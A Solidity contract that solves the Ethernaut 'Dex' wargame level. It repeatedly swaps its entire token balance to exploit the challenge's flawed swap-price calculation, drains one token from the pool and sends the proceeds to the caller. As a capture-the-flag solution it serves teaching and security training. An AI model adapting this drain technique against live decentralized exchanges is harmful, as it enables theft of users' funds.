// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IDex {
    function swap(
        address from,
        address to,
        uint256 amount
    ) external;

    function approve(address spender, uint256 amount) external;
}

contract DexExploit {
    IDex implementation;
    IERC20 tokenX;
    IERC20 tokenY;

    /// @notice Constructor called at deployment of contract
    /// @param _implementation Contract address of ethernaut `Dex` challenge
    /// @param _tokenX Token Address of token1 from `Dex`
    /// @param _tokenY Token Address of token2 from `Dex`
    /// Note: https://ethernaut.openzeppelin.com/level/0x9CB391dbcD447E645D6Cb55dE6ca23164130D008
    constructor(
        IDex _implementation,
        IERC20 _tokenX,
        IERC20 _tokenY
    ) {
        implementation = _implementation;
        tokenX = _tokenX;
        tokenY = _tokenY;
    }

    /// @notice Makes a number of swaps to exploit `getSwapPrice()` wrong logic
    /// Note: approve tokens to this contract before calling `exploit()`. Use `Dex.approve()`;
    function exploit() external {
        tokenX.transferFrom(msg.sender, address(this), 10);
        tokenY.transferFrom(msg.sender, address(this), 10);
        implementation.approve(address(implementation), type(uint256).max);

        _swapMax(tokenX, tokenY);
        _swapMax(tokenY, tokenX);
        _swapMax(tokenX, tokenY);
        _swapMax(tokenY, tokenX);
        _swapMax(tokenX, tokenY);

        implementation.swap(address(tokenY), address(tokenX), 45);

        tokenX.transfer(msg.sender, tokenX.balanceOf(address(this)));
        tokenY.transfer(msg.sender, tokenY.balanceOf(address(this)));
    }

    /// @notice Swaps the contract's balance of first token for second token
    /// @param _tokenX Token Address of `from` token
    /// @param _tokenY Token Address of `to` token
    function _swapMax(IERC20 _tokenX, IERC20 _tokenY) private {
        implementation.swap(
            address(_tokenX),
            address(_tokenY),
            _tokenX.balanceOf(address(this))
        );
    }

    /// @notice Returns a boolean wheter the `implementation` contract challenge has been exploited
    /// @return _isExploitComplete Boolean showing the state of `implementation` exploit
    function exploited() external view returns (bool _isExploitComplete) {
        _isExploitComplete =
            tokenX.balanceOf(address(implementation)) == 0 ||
            tokenY.balanceOf(address(implementation)) == 0;
    }
}
